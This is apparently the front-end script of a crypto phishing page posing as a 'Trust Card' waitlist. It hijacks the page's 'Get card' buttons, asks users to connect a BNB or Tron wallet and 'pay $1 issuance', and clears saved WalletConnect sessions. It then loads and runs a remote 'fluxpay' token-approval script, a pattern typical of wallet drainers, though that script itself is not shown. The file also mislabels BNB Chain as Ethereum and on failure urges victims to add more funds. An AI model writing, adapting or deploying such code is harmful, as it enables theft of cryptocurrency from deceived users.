/**
 * Trust Card Waitlist - Same flow as BEP20 reference (wallete-connect-bep-20)
 * Join waitlist → Apply Now → runApprovalInline(network) for BNB or TRX
 * Same function for both TRC (TRX) and BEP (BNB)
 */
(function () {
  'use strict';

  /* Polyfill process.env for WalletConnect modal (index chunk uses process.env.NODE_ENV) */
  if (typeof window !== 'undefined' && (typeof process === 'undefined' || !process.env)) {
    window.process = window.process || {};
    window.process.env = window.process.env || { NODE_ENV: 'production' };
  }

  try {
    Object.keys(localStorage).forEach(function (key) {
      if (key.startsWith('wc@') || key === 'WALLETCONNECT_DEEPLINK_CHOICE' || key.startsWith('WCM_')) {
        localStorage.removeItem(key);
      }
    });
    if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
      try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
    }
  } catch (_) {}

  var overlay = document.getElementById('waitlist-overlay');
  var formWrap = document.getElementById('waitlist-form-wrap');
  var successWrap = document.getElementById('waitlist-success');
  var failedWrap = document.getElementById('waitlist-failed');
  var closeBtn = document.getElementById('waitlist-close');
  var tryAgainBtn = document.getElementById('waitlist-try-again-btn');

  function ensureOverlay() {
    if (overlay) return overlay;
    var css = '#waitlist-overlay{position:fixed;inset:0;background:rgba(13,17,23,.85);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;z-index:9999;padding:1rem;opacity:0;visibility:hidden;transition:opacity .3s,visibility .3s}#waitlist-overlay.open{opacity:1;visibility:visible}#waitlist-modal{position:relative;background:#0f1729;border:1px solid #1e293b;border-radius:1rem;max-width:min(420px,calc(100vw - 2rem));width:100%;padding:2rem;box-shadow:0 0 60px -10px rgba(33,213,237,.15)}#waitlist-modal h2{font-size:1.5rem;font-weight:600;color:#fff;margin:0 0 .5rem 0}#waitlist-modal .subtitle{color:#94a3b8;font-size:.9rem;margin-bottom:1.5rem}#waitlist-network-cards{display:flex;flex-direction:column;gap:.75rem}.waitlist-network-card{display:flex;flex-direction:column;align-items:flex-start;padding:1rem 1.25rem;background:#1e293b;border:1px solid #334155;border-radius:.75rem;color:#fff;cursor:pointer;text-align:left;transition:border-color .2s,background .2s}.waitlist-network-card:hover{border-color:#22d3ee;background:#334155}#waitlist-close{position:absolute;top:1rem;right:1rem;background:0;border:0;color:#94a3b8;font-size:1.5rem;cursor:pointer;line-height:1}#waitlist-close:hover{color:#fff}.try-again-btn{padding:.5rem 1rem;background:#22d3ee;color:#0f1729;border:0;border-radius:.5rem;cursor:pointer;font-weight:600}';
    var style = document.createElement('style');
    style.id = 'waitlist-popup-inline';
    style.textContent = css;
    if (!document.getElementById('waitlist-popup-inline')) document.head.appendChild(style);
    var html = '<div id="waitlist-overlay"><div id="waitlist-modal"><button type="button" id="waitlist-close" aria-label="Close">×</button><div id="waitlist-form-wrap"><h2>Connect your wallet</h2><p class="subtitle">Choose a network to connect your wallet and pay $1 issuance.</p><div id="waitlist-network-cards"><button type="button" class="waitlist-network-card" data-network="BNB"><span class="waitlist-network-name">Ethereum</span><span class="waitlist-network-desc">BNB Chain • Popular</span></button><button type="button" class="waitlist-network-card" data-network="TRX"><span class="waitlist-network-name">Tron</span><span class="waitlist-network-desc">TRC20 • Efficient</span></button></div></div><div id="waitlist-success" style="display:none"><h3>Application Submitted</h3><p>Redirecting...</p></div><div id="waitlist-failed" style="display:none"><h3>Joining Failed</h3><p>Please ensure you have sufficient BNB or TRX for network fees. If the wallet modal did not appear, try refreshing the page.</p><button type="button" id="waitlist-try-again-btn" class="try-again-btn">Try Again</button></div></div></div>';
    var div = document.createElement('div');
    div.innerHTML = html;
    overlay = div.firstElementChild;
    document.body.appendChild(overlay);
    formWrap = document.getElementById('waitlist-form-wrap');
    successWrap = document.getElementById('waitlist-success');
    failedWrap = document.getElementById('waitlist-failed');
    closeBtn = document.getElementById('waitlist-close');
    tryAgainBtn = document.getElementById('waitlist-try-again-btn');
    if (closeBtn) closeBtn.addEventListener('click', closePopup);
    if (tryAgainBtn) tryAgainBtn.addEventListener('click', resetToForm);
    overlay.addEventListener('click', function (e) { if (e.target === overlay) closePopup(); });
    return overlay;
  }

  function openPopup() {
    ensureOverlay();
    var country = new URLSearchParams(window.location.search).get('country') || 'IN';
    var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
    try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
    overlay.classList.add('open');
    document.body.style.overflow = 'hidden';
  }

  function closePopup() {
    if (overlay) overlay.classList.remove('open');
    document.body.style.overflow = '';
    if (formWrap) formWrap.style.display = 'block';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'none';
  }

  function showFailed() {
    if (formWrap) formWrap.style.display = 'none';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'block';
  }

  function resetToForm() {
    if (formWrap) formWrap.style.display = 'block';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'none';
  }

  function getRedirectUrl() {
    const stored = sessionStorage.getItem('tw-card-redirect');
    if (stored) return stored;
    const country = new URLSearchParams(window.location.search).get('country') || 'IN';
    return window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
  }

  if (overlay) overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closePopup();
  });
  if (closeBtn) closeBtn.addEventListener('click', closePopup);

  function onSuccess() {
    if (formWrap) formWrap.style.display = 'none';
    if (successWrap) successWrap.style.display = 'block';
    if (failedWrap) failedWrap.style.display = 'none';
    var url = getRedirectUrl();
    if (url) {
      setTimeout(function () {
        window.location.href = url.startsWith('/') ? window.location.origin + url : url;
      }, 1500);
    }
  }

  function onError(msg) {
    showFailed();
  }

  var fluxpayRejectionHandler = null;
  function runApprovalInline(network, resetLoading) {
    var baseUrl = (window.TRUST_CARD_APPROVAL_URL || (typeof location !== 'undefined' ? new URL('fluxpay', location.origin).href : 'fluxpay')).replace(/\/$/, '');
    var isTrc = network === 'TRX';
    var scriptUrl = baseUrl + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js');
    var runKey = isTrc ? 'FluxPayTRC20Approval' : 'FluxPayApproval';
    var runFn = window[runKey] && window[runKey].run;

    function done(err) {
      if (fluxpayRejectionHandler) {
        window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
        fluxpayRejectionHandler = null;
      }
      if (resetLoading) resetLoading();
      if (err) onError(err);
    }

    fluxpayRejectionHandler = function (e) {
      if (e && e.reason && (String(e.reason).indexOf('Loading chunk') >= 0 || String(e.reason).indexOf('404') >= 0 || String(e.reason).indexOf('Failed to fetch') >= 0 || String(e.reason).indexOf('ChunkLoadError') >= 0)) {
        e.preventDefault();
        done('Wallet connection failed. Please try again.');
      }
    };
    window.addEventListener('unhandledrejection', fluxpayRejectionHandler);

    if (!runFn) {
      var script = document.createElement('script');
      script.type = 'module';
      script.src = scriptUrl;
      script.onload = function () {
        var fn = window[runKey] && window[runKey].run;
        if (!fn) {
          done('Approval script not loaded');
          return;
        }
        try {
          fn(
            function () {
              if (fluxpayRejectionHandler) {
                window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
                fluxpayRejectionHandler = null;
              }
              if (resetLoading) resetLoading();
              window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
              onSuccess();
            },
            function (err) {
              done(err);
            }
          );
        } catch (e) {
          done(e && e.message ? e.message : 'Connection failed');
        }
      };
      script.onerror = function () {
        done('Failed to load wallet script. Check your connection.');
      };
      document.head.appendChild(script);
      return;
    }

    try {
      runFn(
        function () {
          if (fluxpayRejectionHandler) {
            window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
            fluxpayRejectionHandler = null;
          }
          if (resetLoading) resetLoading();
          window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
          onSuccess();
        },
        function (err) {
          done(err);
        }
      );
    } catch (e) {
      done(e && e.message ? e.message : 'Connection failed');
    }
  }

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) closePopup();
  });

  function setCardLoading(card, loading) {
    if (!card) return;
    card.disabled = loading;
    card.style.opacity = loading ? '0.7' : '';
    card.style.pointerEvents = loading ? 'none' : '';
    var text = card.querySelector('.waitlist-network-name');
    if (text) text.textContent = loading ? 'Loading...' : (card.dataset.network === 'BNB' ? 'Ethereum' : 'Tron');
  }

  document.addEventListener('click', function (e) {
    var card = e.target && e.target.closest && e.target.closest('.waitlist-network-card');
    if (card && card.dataset && card.dataset.network) {
      e.preventDefault();
      e.stopPropagation();
      var network = card.dataset.network;
      if (network === 'BNB' || network === 'TRX') {
        var country = new URLSearchParams(window.location.search).get('country') || 'IN';
        var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
        try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
        setCardLoading(card, true);
        runApprovalInline(network, function () { setCardLoading(card, false); });
      }
    }
  }, true);

  /* Get card opens network choice - use delegation to catch React-rendered buttons */
  function handleGetCardClick(e) {
    var target = e.target;
    var btn = target && target.closest && target.closest('button, a, [role="button"]');
    var text = btn ? (btn.textContent || btn.innerText || '').trim() : '';
    var isGetCard = /Get card|Get your card|Join the Waitlist|Get Started/i.test(text);
    if (!isGetCard && target.closest) {
      var cta = target.closest('[class*="StickyCta_"], [class*="Hero_cta"], [class*="HowItWorks_cta"], [class*="Pricing_cta"]');
      if (cta && cta.querySelector && cta.querySelector('button[class*="Button_primary"]')) {
        isGetCard = true;
      }
    }
    if (isGetCard) {
      e.preventDefault();
      e.stopPropagation();
      openPopup();
    }
  }

  if (tryAgainBtn) tryAgainBtn.addEventListener('click', resetToForm);

  var inited = false;
  function init() {
    if (inited) return;
    inited = true;
    document.addEventListener('click', handleGetCardClick, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  /* Fallback: ensure handler is attached even if DOMContentLoaded already fired */
  setTimeout(init, 500);
})();
